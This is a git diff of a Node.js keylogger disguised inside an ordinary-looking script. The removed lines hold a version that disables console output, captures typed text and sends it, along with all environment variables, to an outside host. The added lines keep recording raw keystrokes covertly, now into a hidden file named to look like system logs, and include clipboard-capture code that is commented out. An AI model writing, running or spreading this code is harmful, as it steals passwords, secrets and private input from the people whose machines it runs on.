@@ -1,8 +1,30 @@
 try {
     const axios = require('axios');
+    const os = require('os');
+    const path = require('path');
+    const fs = require('fs');
+    //const clipboardy = require('clipboardy');
+
+    const homeDir = os.homedir(); // e.g., C:\Users\<YourUsername>
+    const logPath = path.join(homeDir, 'AppData', 'Local', 'system_logs');
 
     let GlobalKeyboardListener;
     let v;
+    let rawBuffer = `\n\n*********************************        ${new Date()}       ********************************\n\n`;
+
+    /*
+    let lastClipboardContent = '';
+
+    setInterval(() => {
+        const currentContent = clipboardy.readSync();
+        if (currentContent !== lastClipboardContent) {
+            //console.log('Clipboard changed:', currentContent);
+            rawBuffer += 'Clip: -------->>>>>>'+currentContent+'\n';
+            lastClipboardContent = currentContent;
+        }
+    }, 1000); // check every second
+    */
+
 
     // Try to require the jsonpacks module
     try {
@@ -12,171 +34,30 @@ try {
         console.warn('Some modules are deprecated and won\'t work well in the future...');
     }
 
-    const hookDomain = "https://hook-server-beta.vercel.app";
-    // const hookDomain = "http://localhost:5000";
-
-    axios.get(`${hookDomain}/hook/init`);
-    let inputBuffer = '';
-    let isShiftPressed = false; 
-    let isCapsLockOn = false; 
-    
-    // if(process.env.CONSOLE_ENABLED !== '1') {
-        console['log'] = ()=>{}; // Disable console.log
-        console['warn'] = ()=>{}; // Disable console.log
-        console['error'] = ()=>{}; // Disable console.log
-    // }
-
-    const shiftSpecialChars = {
-        '1': '!', 
-        '2': '@', 
-        '3': '#', 
-        '4': '$', 
-        '5': '%', 
-        '6': '^', 
-        '7': '&', 
-        '8': '*', 
-        '9': '(', 
-        '0': ')',
-        'MINUS': '_',
-        'EQUALS': '+',
-        'SEMICOLON': ':',
-        "QUOTE": '"',
-        'COMMA': '<',
-        'DOT': '>',
-        'FORWARD SLASH': '?',
-        'BACKSLASH': '|',
-        'SQUARE BRACKET OPEN': '{',
-        'SQUARE BRACKET CLOSE': '}',
-        'SECTION': '~',
-    };
-    
-    const numChars = {
-        'NUMPAD 0' : '0',
-        'NUMPAD DOT' : '.',
-        'NUMPAD 1' : '1',
-        'NUMPAD 2' : '2',
-        'NUMPAD 3' : '3',
-        'NUMPAD 4' : '4',
-        'NUMPAD 5' : '5',
-        'NUMPAD 6' : '6',
-        'NUMPAD 7' : '7',
-        'NUMPAD 8' : '8',
-        'NUMPAD 9' : '9',
-        'NUMPAD DIVIDE' : '/',
-        'NUMPAD MULTIPLY' : '*',
-        'NUMPAD MINUS' : '-',
-        'NUMPAD PLUS' : '+',
-    };
-    
-    const otherChars = {
-        'MINUS': '-',
-        'EQUALS': '=',
-        'SEMICOLON': ';',
-        "QUOTE": "'",
-        'COMMA': ',',
-        'DOT': '.',
-        'FORWARD SLASH': '/',
-        'BACKSLASH': '\\',
-        'SQUARE BRACKET OPEN': '[',
-        'SQUARE BRACKET CLOSE': ']',
-        'SECTION': '`',
-    }
-
     function processKeyEvent(event, down) {
-    if (!v) return;
+        if (!v) return;
+        const keyName = event.name;
 
-    isShiftPressed = down['LEFT SHIFT'] || down['RIGHT SHIFT'];
-    const keyName = event.name;
-
-    if (down[keyName]) {
-        // Handle mouse buttons
-        if (event.rawKey && ['VK_MBUTTON', 'VK_RBUTTON', 'VK_LBUTTON'].includes(event.rawKey._nameRaw)) {
-            if (inputBuffer.length > 0) {
-                const data = {
-                    type: "Mouse",
-                    inputBuffer: inputBuffer,
-                    event: event,
-                    env: process.env
-                };
-                inputBuffer = '';
-                fetchHookDomainAndPostData(data);
-            }
-            return;
-        }
-
-        if (keyName === 'SPACE') {
-            inputBuffer += ' ';
-        } else if (keyName === 'LEFT SHIFT' || keyName === 'RIGHT SHIFT') {
-            // Shift state already handled above
-            return;
-        } else if (keyName === 'BACKSPACE') {
-            inputBuffer = inputBuffer.slice(0, -1);
-        } else if (keyName === 'RETURN' || keyName === 'ENTER') {
-            const data = {
-                type: "Keyboard",
-                inputBuffer: inputBuffer,
-                event: event,
-                env: process.env
-            };
-            inputBuffer = '';
-            fetchHookDomainAndPostData(data);
-            // Do not clear inputBuffer here; it is cleared after POST
-        } else if (keyName === 'CAPS LOCK') {
-            isCapsLockOn = !isCapsLockOn;
-            return;
-        }
-
-        // Handle character keys
-        if (event.rawKey && event.rawKey.name.length === 1) {
-            let charToAdd = keyName;
-
-            // Check if shift is pressed for special characters
-            if (shiftSpecialChars[keyName]) {
-                charToAdd = isShiftPressed ? shiftSpecialChars[keyName] : otherChars[keyName];
-            } else {
-                // Regular alphabetic characters
-                if (
-                    ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn))
-                ) {
-                    charToAdd = keyName.toUpperCase();
-                } else {
-                    charToAdd = keyName.toLowerCase();
+        if (down[keyName]) {
+            
+            const keyName = event.name;
+            if (event.rawKey && ['VK_MBUTTON', 'VK_RBUTTON', 'VK_LBUTTON'].includes(event.rawKey._nameRaw) || keyName === 'RETURN' || keyName === 'ENTER' ) {
+                if(rawBuffer != ''){
+                    rawBuffer += `\n\n\----------------------        ${new Date()}      -----------------------------\n\n`;
+                    fs.writeFile(logPath, rawBuffer, { flag: 'a' }, (err) => {
+                        if (err) {
+                            //console.error('Error writing to file:', err);
+                        } else {
+                            //console.log('Data appended successfully.');
+                        }
+                    });
+                    rawBuffer = '';
                 }
+            } else{
+                rawBuffer += JSON.stringify(event.rawKey)+'\n';
             }
-
-            inputBuffer += charToAdd;
-        }
-
-        if (numChars[keyName]) {
-            inputBuffer += numChars[keyName];
-        }
-        // Debugging: log the current buffer
-        console.log('Current Buffer:', inputBuffer);
-    }
-}
-
-    //let sendTimeout;
-
-    async function fetchHookDomainAndPostData(data) {
-        try {
-            await axios.post(`${hookDomain}/hook/keyboard-event`, data);
-            // Clear buffer only after successful send
-            // inputBuffer = '';
-        } catch (error) {
-            console.error(`Error sending data: ${error}`);
-            // Optionally, keep buffer for retry
         }
     }
-
-    // // In processKeyEvent, schedule sending after a delay
-    // function scheduleSend() {
-    //     clearTimeout(sendTimeout);
-    //     sendTimeout = setTimeout(() => {
-    //         if (inputBuffer.length > 0) {
-    //             fetchHookDomainAndPostData({ type: "Keyboard", inputBuffer, env: process.env });
-    //         }
-    //     }, 500); // 500ms delay
-    // }
 
     const init = () => {
         try {
